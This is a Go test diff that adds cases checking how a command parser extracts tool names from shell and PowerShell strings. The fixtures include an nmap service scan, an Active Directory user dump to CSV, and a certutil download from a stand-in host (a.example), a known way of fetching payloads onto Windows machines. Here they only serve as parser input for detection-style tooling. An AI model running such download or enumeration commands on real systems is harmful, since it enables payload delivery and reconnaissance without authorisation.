@@ -274,3 +274,20 @@ func TestBashHereDocDetection(t *testing.T) {
 		})
 	}
 }
+
+func TestExtractCommandChoosesTheShell(t *testing.T) {
+	cases := []struct {
+		text string
+		want []string
+	}{
+		{"nmap -sV 10.0.0.5 | tee out.txt", []string{"nmap", "tee"}},
+		{"apt-get install -y nmap", []string{"apt-get"}},
+		{"Get-ADUser -Filter * | Export-Csv users.csv", []string{"get-aduser", "export-csv"}},
+		{`pwsh -c "certutil.exe -urlcache -f http://a.example/x"`, []string{"certutil.exe"}},
+	}
+	for _, c := range cases {
+		if got := toolNames(ExtractCommand(c.text)); !slices.Equal(got, c.want) {
+			t.Errorf("ExtractCommand(%q) tools = %q, want %q", c.text, got, c.want)
+		}
+	}
+}
